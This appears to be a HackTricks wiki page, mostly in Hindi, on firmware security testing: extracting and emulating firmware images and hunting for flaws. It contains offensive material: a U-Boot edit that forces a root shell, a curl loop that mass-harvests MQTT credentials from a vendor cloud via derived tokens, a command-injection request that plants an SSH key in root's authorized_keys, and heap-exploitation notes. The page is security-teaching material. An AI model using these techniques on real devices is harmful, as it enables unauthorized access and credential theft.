# फर्मवेयर विश्लेषण

{{#include ../../banners/hacktricks-training.md}}

## **परिचय**

### संबंधित संसाधन


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

फर्मवेयर एक आवश्यक सॉफ़्टवेयर है जो डिवाइस को सही तरीके से काम करने में सक्षम बनाता है, हार्डवेयर कंपोनेंट्स और यूज़र द्वारा इंटरैक्ट किए जाने वाले सॉफ़्टवेयर के बीच संचार को मैनेज और सुविधाजनक बनाकर। इसे स्थायी मेमोरी में स्टोर किया जाता है, जिससे डिवाइस पावर ऑन होते ही महत्वपूर्ण निर्देशों तक पहुंच सकता है और ऑपरेटिंग सिस्टम लॉन्च हो पाता है। फर्मवेयर की जांच और संभावित रूप से संशोधन करना सुरक्षा कमजोरियों की पहचान में एक महत्वपूर्ण कदम है।

## **जानकारी एकत्र करना**

**जानकारी एकत्र करना** डिवाइस की संरचना और उस में उपयोग होने वाली तकनीकों को समझने का एक महत्वपूर्ण प्रारंभिक चरण है। इस प्रक्रिया में निम्नलिखित डेटा इकट्ठा करना शामिल है:

- CPU आर्किटेक्चर और वह कौन सा ऑपरेटिंग सिस्टम चलाता है
- Bootloader विशेषताएँ
- हार्डवेयर लेआउट और datasheets
- कोडबेस मेट्रिक्स और स्रोत स्थान
- बाह्य libraries और लाइसेंस प्रकार
- अपडेट इतिहास और नियामक प्रमाणपत्र
- आर्किटेक्चरल और फ्लो डायग्राम
- सुरक्षा आकलन और पहचानी गई कमजोरियाँ

इसके लिए, **open-source intelligence (OSINT)** tools अमूल्य होते हैं, जैसे उपलब्ध open-source सॉफ़्टवेयर कंपोनेंट्स का मैन्युअल और स्वचालित समीक्षा के माध्यम से विश्लेषण। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसी टूल्स मुफ्त static analysis ऑफर करती हैं जिन्हें संभावित इश्यू खोजने के लिए उपयोग किया जा सकता है।

## **फर्मवेयर प्राप्त करना**

फर्मवेयर प्राप्त करने के कई तरीके हैं, प्रत्येक की अपनी जटिलता होती है:

- स्रोत से सीधे (developers, manufacturers) प्राप्त करना
- दिए गए निर्देशों से इसे build करना
- आधिकारिक support साइट्स से download करना
- होस्ट किए गए firmware फाइलों को खोजने के लिए Google dork queries का उपयोग
- सीधे cloud storage तक पहुँच, जैसे [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसी टूल्स के साथ
- updates को intercept करना via man-in-the-middle techniques
- डिवाइस से extract करना कनेक्शनों के माध्यम से जैसे UART, JTAG, या PICit
- डिवाइस कम्युनिकेशन में update requests को sniff करना
- हार्डकोडेड update endpoints की पहचान और उपयोग
- bootloader या network से dump करना
- जब अन्य सभी कोशिशें असफल हों, तो storage chip को हटाकर पढ़ना, उचित हार्डवेयर टूल्स का उपयोग करके

### UART-only logs: force a root shell via U-Boot env in flash

यदि UART RX ignore किया जा रहा है (केवल logs), तो आप ऑफ़लाइन U-Boot environment blob को edit करके init shell फोर्स कर सकते हैं:

1. SOIC-8 क्लिप + प्रोग्रामर (3.3V) के साथ SPI flash dump करें:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition ढूँढें, `bootargs` को edit करें ताकि उसमें `init=/bin/sh` शामिल हो, और blob के लिए **U-Boot env CRC32 को पुनः गणना (recompute)** करें।
3. केवल env partition को reflash करें और reboot करें; UART पर एक shell दिखाई देनी चाहिए।

यह उन embedded devices पर उपयोगी है जहां bootloader shell disabled है लेकिन env partition external flash access के माध्यम से writable है।

## फर्मवेयर का विश्लेषण

अब जब आपके पास **फर्मवेयर है**, आपको यह जानने के लिए उसके बारे में जानकारी extract करनी होगी कि इसे कैसे हैंडल करना है। इसके लिए आप जिन अलग-अलग टूल्स का उपयोग कर सकते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
यदि आप उन टूल्स से ज्यादा कुछ नहीं पाते हैं तो इमेज की **entropy** की जाँच `binwalk -E <bin>` के साथ करें; यदि entropy कम है तो यह संभवतः encrypted नहीं है। यदि entropy अधिक है तो यह संभवतः encrypted है (या किसी तरह से compressed)।

इसके अलावा, आप इन टूल्स का उपयोग firmware के अंदर embedded **फ़ाइलों को extract** करने के लिए कर सकते हैं:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का उपयोग फ़ाइल की जांच के लिए कर सकते हैं।

### Filesystem प्राप्त करना

पिछले बताए गए टूल्स जैसे `binwalk -ev <bin>` के साथ आप **filesystem को extract** करने में सक्षम होना चाहिए।\
Binwalk आमतौर पर इसे एक **फ़ोल्डर जिसका नाम filesystem के प्रकार के अनुसार होता है** में extract करता है, जो आमतौर पर निम्न में से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### मैन्युअल फ़ाइल सिस्टम निकालना

कभी-कभी, binwalk के signatures में filesystem के **magic byte** नहीं होते। ऐसे मामलों में, binwalk का उपयोग करके filesystem के offset को ढूंढें और बाइनरी से compressed filesystem को carve करें और नीचे दिए गए steps का उपयोग करके उसके प्रकार के अनुसार फ़ाइल सिस्टम को **मैन्युअल रूप से extract** करें।
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem को carve करने के लिए निम्नलिखित **dd command** चलाएँ।
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
विकल्प के रूप में, निम्नलिखित कमांड भी चलाया जा सकता है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

फाइलें बाद में `squashfs-root` डायरेक्टरी में मिलेंगी।

- CPIO archive फाइलें

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 फाइलसिस्टम के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs फाइलसिस्टम के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## फ़र्मवेयर का विश्लेषण

एक बार फ़र्मवेयर प्राप्त हो जाने के बाद, इसकी संरचना और संभावित कमजोरियों को समझने के लिए इसे विश्लेषित करना आवश्यक है। यह प्रक्रिया फ़र्मवेयर इमेज से महत्वपूर्ण डेटा निकालने और विश्लेषण करने के लिए विभिन्न उपकरणों के उपयोग को शामिल करती है।

### प्रारंभिक विश्लेषण उपकरण

बाइनरी फ़ाइल (जिसे `<bin>` के रूप में संदर्भित किया गया है) की प्रारंभिक जाँच के लिए कुछ कमांड दिए गए हैं। ये कमांड फाइल प्रकार पहचानने, strings निकालने, बाइनरी डेटा का विश्लेषण करने, और partition तथा filesystem के विवरण समझने में मदद करते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
इमेज के एन्क्रिप्शन की स्थिति का आकलन करने के लिए, **entropy** को `binwalk -E <bin>` से जांचा जाता है। कम entropy एन्क्रिप्शन की कमी का संकेत देती है, जबकि उच्च entropy संभावित एन्क्रिप्शन या कॉम्प्रेशन की ओर इशारा करती है।

**embedded files** निकालने के लिए, फ़ाइल निरीक्षण के लिए **file-data-carving-recovery-tools** डॉक्यूमेंटेशन और **binvis.io** जैसे टूल और संसाधन सुझाए जाते हैं।

### फ़ाइल सिस्टम निकालना

`binwalk -ev <bin>` का उपयोग करके, आमतौर पर आप filesystem को निकाल सकते हैं, अक्सर उस filesystem प्रकार के नाम पर एक निर्देशिका में (जैसे squashfs, ubifs)। हालाँकि, जब **binwalk** missing magic bytes के कारण filesystem प्रकार की पहचान करने में विफल होता है, तब मैन्युअल एक्सट्रैक्शन आवश्यक होता है। इसमें filesystem के offset का पता लगाने के लिए `binwalk` का उपयोग करना शामिल है, इसके बाद filesystem को carve out करने के लिए `dd` कमांड का उपयोग करना होता है:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
इसके बाद, फ़ाइलसिस्टम के प्रकार (उदा., squashfs, cpio, jffs2, ubifs) के अनुसार, सामग्री को मैन्युअली extract करने के लिए विभिन्न commands का उपयोग किया जाता है।

### फ़ाइलसिस्टम विश्लेषण

फ़ाइलसिस्टम निकालने के बाद, सुरक्षा कमजोरियों की खोज शुरू होती है। ध्यान असुरक्षित network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts, और compiled binaries पर दिया जाता है ताकि उन्हें offline analysis के लिए जांचा जा सके।

**प्रमुख स्थान** और **आइटम** जिन्हें जाँचना चाहिए:

- **etc/shadow** और **etc/passwd** — user credentials के लिए जाँचें
- SSL certificates और keys **etc/ssl** में
- संभावित कमजोरियों के लिए configuration और script फाइलें
- आगे की analysis के लिए embedded binaries
- सामान्य IoT device web servers और binaries

फ़ाइलसिस्टम के भीतर संवेदनशील जानकारी और कमजोरियों को खोजने में कई tools सहायक होते हैं:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker) संवेदनशील जानकारी खोजने के लिए
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) व्यापक firmware analysis के लिए
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba) static और dynamic analysis के लिए

### Compiled Binaries पर सुरक्षा जाँच

फ़ाइलसिस्टम में मिले source code और compiled binaries दोनों को कमजोरियों के लिए कड़ाई से जाँचना चाहिए। **checksec.sh** (Unix binaries के लिए) और **PESecurity** (Windows binaries के लिए) जैसी tools अनप्रोटेक्टेड बाइनरीज़ की पहचान करने में मदद करती हैं जिन्हें exploit किया जा सकता है।

## Derived URL tokens के माध्यम से cloud config और MQTT credentials निकालना

कई IoT hubs अपनी per-device configuration उस तरह के cloud endpoint से fetch करते हैं जो कुछ इस तरह दिखता है:

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान आप पा सकते हैं कि `<token>` लोकल रूप से device ID और एक hardcoded secret का उपयोग करके निकाला जाता है, उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) और यह uppercase hex के रूप में प्रस्तुत होता है

यह डिज़ाइन किसी भी व्यक्ति को जो deviceId और STATIC_KEY जानता है, URL पुनर्निर्मित करने और cloud config प्राप्त करने में सक्षम बनाता है, जो अक्सर plaintext MQTT credentials और topic prefixes उजागर कर देता है।

व्यावहारिक वर्कफ़्लो:

1) UART boot logs से deviceId निकालें

- 3.3V UART adapter (TX/RX/GND) कनेक्ट करें और logs कैप्चर करें:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- उदाहरण के लिए, cloud config URL pattern और broker address प्रिंट करने वाली लाइनों को खोजें:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) फ़र्मवेयर से STATIC_KEY और token एल्गोरिथ्म पुनः प्राप्त करें

- बाइनरीज़ को Ghidra/radare2 में लोड करें और config path ("/pf/") या MD5 के उपयोग के लिए खोजें।
- एल्गोरिथ्म की पुष्टि करें (उदा., MD5(deviceId||STATIC_KEY)).
- Bash में token निकालें और digest को uppercase करें:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config और MQTT credentials एकत्र करें

- URL बनाकर curl से JSON खींचें; jq से पार्स कर secrets निकालें:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT और weak topic ACLs (यदि मौजूद हों) का दुरुपयोग करें

- recovered credentials का उपयोग करके maintenance topics को subscribe करें और sensitive events की तलाश करें:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate predictable device IDs (at scale, with authorization)

- कई ecosystems vendor OUI/product/type bytes एम्बेड करते हैं, और उसके बाद एक क्रमिक suffix जुड़ा होता है।
- आप candidate IDs को iterate करके, tokens निकालकर और configs प्रोग्रामेटिकली फ़ेच कर सकते हैं:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
नोट्स
- हमेशा mass enumeration का प्रयास करने से पहले स्पष्ट अनुमति प्राप्त करें।
- जहाँ संभव हो, target hardware को बदले बिना गोपनीय जानकारी recover करने के लिए emulation या static analysis को प्राथमिकता दें।

The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.

### Emulating Individual Binaries

एकल प्रोग्राम की जांच के लिए, प्रोग्राम की endianness और CPU architecture की पहचान करना आवश्यक है।

#### Example with MIPS Architecture

MIPS architecture वाले binary को emulate करने के लिए, निम्न command का उपयोग किया जा सकता है:
```bash
file ./squashfs-root/bin/busybox
```
और आवश्यक emulation tools इंस्टॉल करने के लिए:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

ARM बाइनरीज़ के लिए प्रक्रिया समान होती है, और इम्यूलेशन के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

इस चरण में, विश्लेषण के लिए या तो वास्तविक डिवाइस या emulated डिवाइस environment का उपयोग किया जाता है। OS और filesystem का shell access बनाए रखना आवश्यक है। इम्यूलेशन हार्डवेयर इंटरैक्शन को पूरी तरह से नकल नहीं कर पाती, इसलिए कभी-कभी emulation को restart करना पड़ सकता है। विश्लेषण के दौरान filesystem को दोबारा जाँचना चाहिए, exposed webpages और network services का exploit करना चाहिए, और bootloader vulnerabilities का परीक्षण करना चाहिए। Firmware integrity टेस्ट महत्वपूर्ण होते हैं ताकि संभावित backdoor vulnerabilities की पहचान की जा सके।

## Runtime Analysis Techniques

Runtime analysis में किसी process या binary के operating environment में इंटरैक्ट करना शामिल है, और breakpoints सेट करने और fuzzing व अन्य तकनीकों के जरिए vulnerabilities पहचानने के लिए gdb-multiarch, Frida, और Ghidra जैसे tools का उपयोग किया जाता है।

For embedded targets without a full debugger, **copy a statically-linked `gdbserver`** to the device and attach remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Binary Exploitation and Proof-of-Concept

पहचान की गई कमजोरियों के लिए PoC विकसित करने में लक्षित आर्किटेक्चर की गहरी समझ और लो-लेवल भाषाओं में प्रोग्रामिंग आवश्यक है। एम्बेडेड सिस्टम में binary runtime protections आम नहीं होते, लेकिन यदि मौजूद हों तो Return Oriented Programming (ROP) जैसी तकनीकों की आवश्यकता पड़ सकती है।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc uses fastbins similar to glibc. A later large allocation can trigger `__malloc_consolidate()`, so any fake chunk must survive checks (sane size, `fd = 0`, and surrounding chunks seen as "in use").
- **Non-PIE binaries under ASLR:** if ASLR is enabled but the main binary is **non-PIE**, in-binary `.data/.bss` addresses are stable. You can target a region that already resembles a valid heap chunk header to land a fastbin allocation on a **function pointer table**.
- **Parser-stopping NUL:** when JSON is parsed, a `\x00` in the payload can stop parsing while keeping trailing attacker-controlled bytes for a stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** a ROP chain that calls `open("/proc/self/mem")`, `lseek()`, and `write()` can plant executable shellcode in a known mapping and jump to it.

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) pre-configured environment प्रदान करते हैं ताकि फर्मवेयर सुरक्षा परीक्षण के लिए आवश्यक tools उपलब्ध रहें।

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है जो आपको Internet of Things (IoT) devices के security assessment और penetration testing करने में मदद करने के लिए बनाया गया है। यह एक pre-configured environment के साथ सभी आवश्यक tools पहले से लोड करके आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित Embedded security testing operating system जो फर्मवेयर सुरक्षा परीक्षण उपकरणों के साथ preloaded आता है।

## Firmware Downgrade Attacks & Insecure Update Mechanisms

भले ही कोई vendor firmware images के लिए cryptographic signature checks लागू करे, **version rollback (downgrade) protection अक्सर छोड़ी जाती है**। जब boot- या recovery-loader केवल embedded public key के साथ signature सत्यापित करता है लेकिन फ्लैश की जा रही इमेज के *version* (या किसी monotonic counter) की तुलना नहीं करता, तो attacker वैध तरीके से एक **पुरानी, vulnerable firmware जो अभी भी वैध signature धारण करती है** इंस्टॉल कर सकता है और patched कमजोरियों को फिर से पुनःप्रविष्ट कर सकता है।

Typical attack workflow:

1. **Obtain an older signed image**
* इसे vendor के सार्वजनिक download पोर्टल, CDN या support साइट से प्राप्त करें।
* इसे companion mobile/desktop applications से extract करें (उदा. एक Android APK के अंदर `assets/firmware/` में)।
* इसे third-party repositories जैसे VirusTotal, Internet archives, forums, आदि से retrieve करें।
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* कई consumer IoT devices *unauthenticated* HTTP(S) endpoints एक्सपोज़ करते हैं जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side पर decode करते हैं और recovery/upgrade ट्रिगर करते हैं।
3. डाउनग्रेड के बाद, उस vulnerability का exploit करें जिसे नई रिलीज़ में patch किया गया था (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. वैकल्पिक रूप से persistence मिलने के बाद detection से बचने के लिए नवीनतम image वापस फ़्लैश करें या updates को disable कर दें।

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In the vulnerable (downgraded) firmware, the `md5` parameter is concatenated directly into a shell command without sanitisation, allowing injection of arbitrary commands (here – enabling SSH key-based root access). Later firmware versions introduced a basic character filter, but the absence of downgrade protection renders the fix moot.

### Mobile Apps से Firmware निकालना

कई विक्रेता अपने companion mobile applications के अंदर पूरे firmware images को bundle करते हैं ताकि app device को Bluetooth/Wi-Fi के जरिए update कर सके। ये packages आमतौर पर बिना encryption के APK/APEX में `assets/fw/` या `res/raw/` जैसे paths के तहत स्टोर होते हैं। Tools जैसे `apktool`, `ghidra`, या साधारण `unzip` आपको physical hardware को छुए बिना signed images को निकालने की अनुमति देते हैं।
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### अपडेट लॉजिक का मूल्यांकन करने के लिए चेकलिस्ट

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या डिवाइस फ्लैश करने से पहले **version numbers** या एक **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के भीतर verify किया जाता है (e.g. signatures checked by ROM code)?
* क्या userland code अतिरिक्त sanity checks करता है (e.g. allowed partition map, model number)?
* क्या *partial* या *backup* update flows वही validation logic reuse कर रहे हैं?

> 💡  यदि उपर्युक्त में से कोई भी मौजूद नहीं है, तो प्लेटफ़ॉर्म संभवतः rollback attacks के लिए कमजोर है।

## Vulnerable firmware to practice

firmware में vulnerabilities खोजने का अभ्यास करने के लिए, निम्नलिखित vulnerable firmware projects को प्रारम्भिक बिंदु के रूप में उपयोग करें।

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
